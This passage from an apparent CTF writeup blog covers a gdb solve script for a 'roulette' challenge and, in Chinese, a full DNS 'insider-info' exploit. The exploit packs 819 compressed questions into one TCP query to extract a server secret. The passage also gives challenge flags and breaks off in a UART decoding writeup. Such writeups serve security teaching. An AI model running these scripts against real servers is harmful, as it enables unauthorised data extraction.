class="line">dummy = <span class="string">&quot;A&quot;</span> * <span class="number">106</span></span><br><span class="line">gdb.execute(<span class="string">f&quot;run &lt;&lt;&lt; &#x27;<span class="subst">&#123;dummy&#125;</span>&#x27;&quot;</span>)</span><br></pre></td></tr></table></figure>
+<h2 id="running-the-script">Running the Script</h2>
+<p>Save the script as <code>solve_roulette.py</code> and run:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ gdb -x solve_roulette.py -batch</span><br></pre></td></tr></table></figure>
+<p>The script runs through all 27 rounds. On each iteration, you'll see
+output like:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[Round 0]</span><br><span class="line">  eax       = 0x3a6f7b2c</span><br><span class="line">  edi       = 0x41414141 (current chunk)</span><br><span class="line">  target    = 0xdeadbeef</span><br><span class="line">  required  = 0xe4d6c518</span><br><span class="line">  patched   = b&#x27;\x18\xc5\xd6\xe4&#x27; -&gt; &#x27;...&#x27;</span><br><span class="line">...</span><br><span class="line">[All rounds complete!]</span><br><span class="line">FLAG: UMDCTF&#123;**************************************************************************************************&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="flag">Flag</h2>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UMDCTF&#123;I_R3ALLY-want-to-pl4y-the-p0werball,+but-my-d4d-said-no-so-im-b3tting-ill-win-on-POLYMARKETinstead&#125;</span><br></pre></td></tr></table></figure>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="https://vkkkv.github.io/wp/umdctf2026/umdctf2026-insider-info/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.png">
+      <meta itemprop="name" content="vkkkv">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hello Navi">
+      <meta itemprop="description" content="A blog about CTF writeups, Linux, Mathematics, Technology, and personal thoughts.">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content=" | Hello Navi">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/wp/umdctf2026/umdctf2026-insider-info/" class="post-title-link" itemprop="url">UMDCTF 2026 - insider-info</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+
+      <time title="Created: 2026-04-26 10:00:00" itemprop="dateCreated datePublished" datetime="2026-04-26T10:00:00+08:00">2026-04-26</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">Edited on</span>
+      <time title="Modified: 2026-05-24 09:11:09" itemprop="dateModified" datetime="2026-05-24T09:11:09+08:00">2026-05-24</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">In</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/ctf/" itemprop="url" rel="index"><span itemprop="name">ctf</span></a>
+        </span>
+    </span>
+
+  
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="far fa-comment"></i>
+      </span>
+      <span class="post-meta-item-text">Disqus: </span>
+    
+    <a title="disqus" href="/wp/umdctf2026/umdctf2026-insider-info/#disqus_thread" itemprop="discussionUrl">
+      <span class="post-comments-count disqus-comment-count" data-disqus-identifier="wp/umdctf2026/umdctf2026-insider-info/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <blockquote>
+<p>A mysterious DNS server is running on the inside. It holds a secret —
+but you'll need to be clever to extract it all.</p>
+<p><strong>Hint:</strong> Can you ask more than one question at a
+time?</p>
+</blockquote>
+<h2 id="dns-基础">DNS 基础</h2>
+<h4 id="dns-消息长什么样">1. DNS 消息长什么样</h4>
+<p>DNS 消息在网络上是二进制数据，分五段：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">+------------------------+</span><br><span class="line">| Header (12 字节)       |  ← 消息头</span><br><span class="line">+------------------------+</span><br><span class="line">| Question (问题区)       |  ← 你问的是哪个域名</span><br><span class="line">+------------------------+</span><br><span class="line">| Answer (回答区)         |</span><br><span class="line">+------------------------+</span><br><span class="line">| Authority (权威区)      |</span><br><span class="line">+------------------------+</span><br><span class="line">| Additional (附加区)     |</span><br><span class="line">+------------------------+</span><br></pre></td></tr></table></figure>
+<p>Header 里最重要的四个字段是计数，告诉解析器每个区有多少条目：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">QDCOUNT — 问题区有几个问题</span><br><span class="line">ANCOUNT — 回答区有几个回答</span><br><span class="line">NSCOUNT — 权威区有几个记录</span><br><span class="line">ARCOUNT — 附加区有几个记录</span><br></pre></td></tr></table></figure>
+<p>一般情况下 QDCOUNT=1，每次只问一个问题。</p>
+<h4 id="域名在消息里不是字符串">2. 域名在消息里不是字符串</h4>
+<p>域名不是直接写 <code>www.example.com</code>。它按 <code>.</code>
+拆成标签（labels），每个标签前加 1 字节长度：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">www.example.com 编码为：</span><br><span class="line">[3] &#x27;w&#x27; &#x27;w&#x27; &#x27;w&#x27;  [7] &#x27;e&#x27; &#x27;x&#x27; &#x27;a&#x27; &#x27;m&#x27; &#x27;p&#x27; &#x27;l&#x27; &#x27;e&#x27;  [3] &#x27;c&#x27; &#x27;o&#x27; &#x27;m&#x27;  [0]</span><br><span class="line">  ↑3字节          ↑7字节                 ↑3字节              ↑结束符</span><br></pre></td></tr></table></figure>
+<p>记这个编码方式，后面解压缩要用到。</p>
+<h4 id="dns-名称压缩核心机制">3. DNS 名称压缩——核心机制</h4>
+<p>同一个域名后缀会在一个消息里反复出现（问题区一个、回答区可能好几个）。每次都完整编码很浪费空间。</p>
+<p><strong>解决方案：用 2 字节的指针代替重复标签。</strong></p>
+<p>指针怎么和标签区分？标签长度字节的<strong>高 2
+位</strong>是标识位：</p>
+<table>
+<thead>
+<tr>
+<th>高 2 位</th>
+<th>含义</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>00</td>
+<td>普通标签（长度 0-63）</td>
+</tr>
+<tr>
+<td>11</td>
+<td><strong>压缩指针</strong></td>
+</tr>
+</tbody>
+</table>
+<blockquote>
+<p>普通标签最长 63 字节，二进制 <code>00111111</code>，高两位永远
+<code>00</code>。所以用 <code>11</code> 做指针标识不会混淆。</p>
+</blockquote>
+<p>指针格式：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"> 1  1 | 14-bit OFFSET</span><br><span class="line">+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+</span><br><span class="line">| 1  1|         OFFSET                            |</span><br><span class="line">+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+</span><br></pre></td></tr></table></figure>
+<p>高 2 位 = <code>11</code> → 第一字节 ≥ 192 (0xC0) 低 14 位 =
+从消息开头算起的偏移量</p>
+<p><strong>举例</strong>：<code>0xC0 0x0C</code> - <code>0xC0</code> =
+<code>11000000</code> → 是指针 - 低 14 位 = 12 → 指向消息偏移 12
+的位置</p>
+<p><strong>域名可以部分用标签、部分用指针拼接</strong>：</p>
+<p><code>FOO.example.com</code> 如果 <code>.example.com</code>
+已经在前面出现过：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[3] &#x27;F&#x27; &#x27;O&#x27; &#x27;O&#x27;  +  [指针指向.example.com的位置]</span><br><span class="line">    ↑新标签          ↑复用的是后面的所有标签</span><br></pre></td></tr></table></figure>
+<p>甚至可以<strong>整个域名只用一个指针</strong>指向之前出现过的相同域名。</p>
+<h4 id="一个消息可以问多个问题吗">4. 一个消息可以问多个问题吗？</h4>
+<p>可以。QDCOUNT 字段可以大于 1。</p>
+<p>不过传统 DNS 服务器通常不支持（RFC 9619
+甚至禁止了），但<strong>自定义 DNS
+服务器</strong>可以自己处理。这题的服务端就支持。</p>
+<h4 id="tcp-也能跑-dns">5. TCP 也能跑 DNS</h4>
+<p>常规 DNS 用 UDP 端口 53，但 TCP 也行。</p>
+<table>
+<thead>
+<tr>
+<th></th>
+<th>UDP</th>
+<th>TCP</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>消息前缀</td>
+<td>无</td>
+<td><strong>2 字节长度</strong>（大端）+ 消息体</td>
+</tr>
+<tr>
+<td>大小限制</td>
+<td>512 字节传统上限</td>
+<td>无实际限制</td>
+</tr>
+<tr>
+<td>使用场景</td>
+<td>普通查询</td>
+<td>大响应、zone transfer</td>
+</tr>
+</tbody>
+</table>
+<p>TCP 传输时：先发 2 字节告诉我们接下来有多少字节的 DNS
+消息，再发消息体。</p>
+<hr />
+<h3 id="challenge-overview">Challenge Overview</h3>
+<p>题目给了一个自定义 DNS 服务器（监听 TCP），每次连接生成一个
+<strong>819 字符的随机 secret</strong>。</p>
+<p>服务器接受两种 TXT 记录查询：</p>
+<ol type="1">
+<li><strong>单字符查询</strong>：查
+<code>&lt;N&gt;.inside.info</code>（N 是 0~818）→ 返回第 N 位的字符</li>
+<li><strong>完整 secret 查询</strong>：查
+<code>完整secret(用点分63字符块).inside.info</code> → 返回 flag</li>
+</ol>
+<p>限制：<strong>每个连接只能发 2 次 DNS 查询</strong>，新连接生成全新
+secret。</p>
+<h3 id="分析">分析</h3>
+<p>要拿到 819 个字符，但只许问 2
+次。意味着第一次查询要<strong>一次性提取全部字符</strong>。</p>
+<p>每次查一个（<code>0.inside.info</code> → 拿字符
+0，<code>1.inside.info</code> → 拿字符
+1...）如果每个都单独发一次查询，需要 819 次，显然不行。</p>
+<h3 id="思路">思路</h3>
+<p>利用 <strong>QDCOUNT &gt; 1</strong>，把 819 个问题全塞进一个 DNS
+消息：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">一条消息里：</span><br><span class="line">  Question 0: 0.inside.info → TXT</span><br><span class="line">  Question 1: 1.inside.info → TXT</span><br><span class="line">  ...</span><br><span class="line">  Question 818: 818.inside.info → TXT</span><br></pre></td></tr></table></figure>
+<p>服务端收到 QDCOUNT=819，逐个回答，一次返回 819 个字符。</p>
+<p>如果不压缩，每个 question： - <code>0.inside.info</code> 的域名编码 ≈
+16 字节 - QTYPE(2) + QCLASS(2) = 4 字节 - 共 ≈ 20 字节</p>
+<p>819 × 20 = 16,380 字节 → 太大了。</p>
+<p>819 个 question 共享同一个后缀
+<strong><code>.inside.info</code></strong>。</p>
+<p>把 <code>.inside.info</code>
+的完整标签编码放在消息<strong>末尾</strong>，每个 question 用<strong>2
+字节指针</strong>指向它：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">未压缩的 0.inside.info：</span><br><span class="line">  [1] &#x27;0&#x27;  [6] &#x27;i&#x27; &#x27;n&#x27; &#x27;s&#x27; &#x27;i&#x27; &#x27;d&#x27; &#x27;e&#x27;  [4] &#x27;i&#x27; &#x27;n&#x27; &#x27;f&#x27; &#x27;o&#x27;  [0]</span><br><span class="line">                                            ↑每次都重复这堆</span><br><span class="line"></span><br><span class="line">压缩后的 0.inside.info：</span><br><span class="line">  [1] &#x27;0&#x27;  +  [2字节指针 → .inside.info]  +  [QTYPE][QCLASS]</span><br><span class="line">   ↑只编数字     ↑指向消息末尾的共享后缀       ↑4字节</span><br></pre></td></tr></table></figure>
+<p>每个 question 从 ~20 字节压缩到 <strong>~7 字节</strong>。</p>
+<p>819 × 7 ≈ 5,700 字节，TCP 消息完全装得下。</p>
+<h3 id="攻击流程">攻击流程</h3>
+<p><strong>Query 1</strong> — 塞入 819 个压缩 question：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Header: QDCOUNT=819</span><br><span class="line">Question 0: [1]&#x27;0&#x27; + [指针→.inside.info] + TXT/IN</span><br><span class="line">Question 1: [1]&#x27;1&#x27; + [指针→.inside.info] + TXT/IN</span><br><span class="line">...</span><br><span class="line">Question 818: [3]&#x27;818&#x27; + [指针→.inside.info] + TXT/IN</span><br><span class="line">[消息末尾]: 完整的 .inside.info 标签编码 ← 指针指向这里</span><br></pre></td></tr></table></figure>
+<p>服务器回复 819 条 TXT 记录，每条一个字符。拼接出完整 secret。</p>
+<p><strong>Query 2</strong> — 查 <code>完整secret.inside.info</code> →
+拿到 flag。</p>
+<h3 id="exploit-code">Exploit Code</h3>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">build_compressed_question</span>(<span class="params">num_bytes, suffix_offset</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;构造一个压缩 question: [数字标签] + [2字节指针→后缀] + [QTYPE][QCLASS]&quot;&quot;&quot;</span></span><br><span class="line">    buf = <span class="built_in">bytes</span>([<span class="built_in">len</span>(num_bytes)]) + num_bytes           <span class="comment"># 标签：长度 + 内容</span></span><br><span class="line">    buf += struct.pack(<span class="string">&#x27;!H&#x27;</span>, <span class="number">0xC000</span> | suffix_offset)    <span class="comment"># 指针：指向共享后缀</span></span><br><span class="line">    buf += struct.pack(<span class="string">&#x27;!HH&#x27;</span>, <span class="number">16</span>, <span class="number">1</span>)                    <span class="comment"># QTYPE=TXT, QCLASS=IN</span></span><br><span class="line">    <span class="keyword">return</span> buf</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read_dns_name</span>(<span class="params">data, pos</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;跳过 DNS 域名（可能含压缩指针），返回下一个字段的起始位置&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">while</span> pos &lt; <span class="built_in">len</span>(data):</span><br><span class="line">        b = data[pos]</span><br><span class="line">        <span class="keyword">if</span> b == <span class="number">0</span>:          <span class="comment"># 结束符</span></span><br><span class="line">            <span class="keyword">return</span> pos + <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> (b &amp; <span class="number">0xC0</span>) == <span class="number">0xC0</span>:  <span class="comment"># 压缩指针，占 2 字节</span></span><br><span class="line">            <span class="keyword">return</span> pos + <span class="number">2</span></span><br><span class="line">        pos += <span class="number">1</span> + b        <span class="comment"># 普通标签：1字节长度 + N字节内容</span></span><br><span class="line">    <span class="keyword">return</span> pos</span><br><span class="line"></span><br><span class="line"><span class="comment"># --- Query 1: 提取全部 819 个字符 ---</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 先构建所有 question（用占位偏移 0）</span></span><br><span class="line">questions_placeholder = <span class="string">b&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">819</span>):</span><br><span class="line">    num = <span class="built_in">str</span>(i).encode()</span><br><span class="line">    questions_placeholder += build_compressed_question(num, <span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 计算共享后缀 .inside.info 的偏移位置（在 question 区之后）</span></span><br><span class="line">suffix_offset = <span class="number">12</span> + <span class="built_in">len</span>(questions_placeholder)</span><br><span class="line">suffix_encoding = <span class="string">b&#x27;\x06inside\x04info\x00&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 用真实偏移重新构建 question</span></span><br><span class="line">questions = <span class="string">b&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">819</span>):</span><br><span class="line">    num = <span class="built_in">str</span>(i).encode()</span><br><span class="line">    questions += build_compressed_question(num, suffix_offset)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 把后缀编码追加到末尾</span></span><br><span class="line">questions += suffix_encoding</span><br><span class="line"></span><br><span class="line"><span class="comment"># 组装 DNS 消息</span></span><br><span class="line">dns_header = struct.pack(<span class="string">&#x27;!HHHHHH&#x27;</span>, <span class="number">0x1337</span>, <span class="number">0x0100</span>, <span class="number">819</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">packet = dns_header + questions</span><br><span class="line"></span><br><span class="line"><span class="comment"># TCP 发送（2 字节长度前缀）</span></span><br><span class="line">sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">sock.connect((<span class="string">&#x27;challenge.umdctf.io&#x27;</span>, <span class="number">31337</span>))</span><br><span class="line">sock.send(struct.pack(<span class="string">&#x27;!H&#x27;</span>, <span class="built_in">len</span>(packet)) + packet)</span><br><span class="line"></span><br><span class="line"><span class="comment"># TCP 接收（先读 2 字节长度，再读取消息体）</span></span><br><span class="line">resp_len = struct.unpack(<span class="string">&#x27;!H&#x27;</span>, sock.recv(<span class="number">2</span>))[<span class="number">0</span>]</span><br><span class="line">resp = <span class="string">b&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">while</span> <span class="built_in">len</span>(resp) &lt; resp_len:</span><br><span class="line">    chunk = sock.recv(resp_len - <span class="built_in">len</span>(resp))</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> chunk:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    resp += chunk</span><br><span class="line"></span><br><span class="line"><span class="comment"># 从响应中解析 819 个 TXT 记录，提取每个字符</span></span><br><span class="line">pos = <span class="number">12</span>  <span class="comment"># 跳过 DNS header</span></span><br><span class="line"><span class="comment"># 跳过 question 区（服务端在响应里回显了所有 question）</span></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">819</span>):</span><br><span class="line">    pos = read_dns_name(resp, pos)</span><br><span class="line">    pos += <span class="number">4</span>  <span class="comment"># QTYPE + QCLASS</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 解析 answer 区</span></span><br><span class="line">secret_chars = []</span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">819</span>):</span><br><span class="line">    pos = read_dns_name(resp, pos)  <span class="comment"># NAME</span></span><br><span class="line">    rtype, rclass, ttl, rdlen = struct.unpack(<span class="string">&#x27;!HHIH&#x27;</span>, resp[pos:pos+<span class="number">10</span>])</span><br><span class="line">    pos += <span class="number">10</span></span><br><span class="line">    <span class="keyword">if</span> rtype == <span class="number">16</span>:  <span class="comment"># TXT 记录</span></span><br><span class="line">        txt_len = resp[pos]          <span class="comment"># TXT 的第一个字节是字符串长度</span></span><br><span class="line">        char = resp[pos+<span class="number">1</span>:pos+<span class="number">1</span>+txt_len].decode()</span><br><span class="line">        secret_chars.append(char)</span><br><span class="line">    pos += rdlen</span><br><span class="line"></span><br><span class="line">secret = <span class="string">&#x27;&#x27;</span>.join(secret_chars)</span><br><span class="line"></span><br><span class="line"><span class="comment"># --- Query 2: 拿 flag ---</span></span><br><span class="line"><span class="comment"># secret 分成 63 字符的块（DNS 标签长度上限）</span></span><br><span class="line">chunks = [secret[i:i+<span class="number">63</span>] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(secret), <span class="number">63</span>)]</span><br><span class="line">full_name = <span class="string">&#x27;.&#x27;</span>.join(chunks) + <span class="string">&#x27;.inside.info&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 编码完整域名 + question</span></span><br><span class="line">qname = <span class="string">b&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> part <span class="keyword">in</span> full_name.split(<span class="string">&#x27;.&#x27;</span>):</span><br><span class="line">    qname += <span class="built_in">bytes</span>([<span class="built_in">len</span>(part)]) + part.encode()</span><br><span class="line">qname += <span class="string">b&#x27;\x00&#x27;</span></span><br><span class="line">flag_question = qname + struct.pack(<span class="string">&#x27;!HH&#x27;</span>, <span class="number">16</span>, <span class="number">1</span>)</span><br><span class="line">flag_header = struct.pack(<span class="string">&#x27;!HHHHHH&#x27;</span>, <span class="number">0x1338</span>, <span class="number">0x0100</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">flag_packet = flag_header + flag_question</span><br><span class="line"></span><br><span class="line">sock.send(struct.pack(<span class="string">&#x27;!H&#x27;</span>, <span class="built_in">len</span>(flag_packet)) + flag_packet)</span><br><span class="line"><span class="comment"># 解析 flag... （与上面类似的 TXT 解析逻辑）</span></span><br><span class="line">sock.close()</span><br></pre></td></tr></table></figure>
+<h3 id="关键点总结">关键点总结</h3>
+<table>
+<colgroup>
+<col style="width: 27%" />
+<col style="width: 72%" />
+</colgroup>
+<thead>
+<tr>
+<th>概念</th>
+<th>在这道题里的作用</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>QDCOUNT &gt; 1</strong></td>
+<td>一个消息塞 819 个问题，一次拿到全部字符</td>
+</tr>
+<tr>
+<td><strong>名称压缩（指针）</strong></td>
+<td>每个 question 共享 <code>.inside.info</code> 后缀，大小从 20
+字节降到 7 字节</td>
+</tr>
+<tr>
+<td><strong>TCP 传输</strong></td>
+<td>消息太大放不进 UDP，用 TCP 的 2 字节长度前缀可靠传输</td>
+</tr>
+<tr>
+<td><strong>TXT 记录</strong></td>
+<td>服务器用 TXT 返回单字符，1 字节长度前缀 + 1 字节字符</td>
+</tr>
+</tbody>
+</table>
+<h3 id="flag">Flag</h3>
+<span class="spoiler" onclick="this.classList.toggle('spoiler')"><span class="spoiler-blur ">UMDCTF{5Ur31Y_N0_0N3_W111_N071C3_MY_1N51D3r_7r4D1N6}</span></span>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="https://vkkkv.github.io/wp/umass2026/umassctf2026-brick-by-brick2/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.png">
+      <meta itemprop="name" content="vkkkv">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hello Navi">
+      <meta itemprop="description" content="A blog about CTF writeups, Linux, Mathematics, Technology, and personal thoughts.">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content=" | Hello Navi">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/wp/umass2026/umassctf2026-brick-by-brick2/" class="post-title-link" itemprop="url">UMass CTF 2026 - Brick by Brick</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+
+      <time title="Created: 2026-04-15 11:39:33" itemprop="dateCreated datePublished" datetime="2026-04-15T11:39:33+08:00">2026-04-15</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">Edited on</span>
+      <time title="Modified: 2026-04-27 14:51:56" itemprop="dateModified" datetime="2026-04-27T14:51:56+08:00">2026-04-27</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">In</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/ctf/" itemprop="url" rel="index"><span itemprop="name">ctf</span></a>
+        </span>
+    </span>
+
+  
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="far fa-comment"></i>
+      </span>
+      <span class="post-meta-item-text">Disqus: </span>
+    
+    <a title="disqus" href="/wp/umass2026/umassctf2026-brick-by-brick2/#disqus_thread" itemprop="discussionUrl">
+      <span class="post-comments-count disqus-comment-count" data-disqus-identifier="wp/umass2026/umassctf2026-brick-by-brick2/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <blockquote>
+<p>我们从建筑大师工作室截获了一个信号。看起来有人在和一个定制的乐高控制器通信，但我们捕捉到的只有这些原始数据。你能拼凑出信息吗？</p>
+<p><strong>Hint 1</strong> This kind of communication is widely used,
+especially for older I/O devices and connectors.
+这种通信方式应用广泛，尤其适用于老式 I/O 设备和连接器。</p>
+<p><strong>Hint 2</strong> Every message starts with a falling edge.
+Have you tried PulseView? 每条信息都以下降沿开始。您试过 PulseView
+吗？</p>
+<p><strong>Hint 3</strong> UART, 8N1. You just need to figure out the
+baud rate. UART，8N1。你只需计算出波特率。</p>
+</blockquote>
+<h3 id="initial-analysis">Initial Analysis</h3>
+<p>This challenge involves decoding a UART signal captured as raw logic
+levels in a CSV file. The provided <code>code.csv</code> contains two
+columns: <code>timestamp</code> and <code>logic_level</code>.</p>
+<ul>
+<li><strong>Initial Inspection:</strong> The logic level is mostly
+<code>1</code> (Idle high), which is characteristic of UART.</li>
+<li><strong>Pulse Width Analysis:</strong> By calculating the time
+between transitions, we find that the minimum pulse duration is
+approximately <code>2.996e-05</code> seconds.</li>
+<li><strong>Baud Rate Calculation:</strong> <span
+class="math display">\[\text{Baud Rate} = \frac{1}{\text{Bit Duration}}
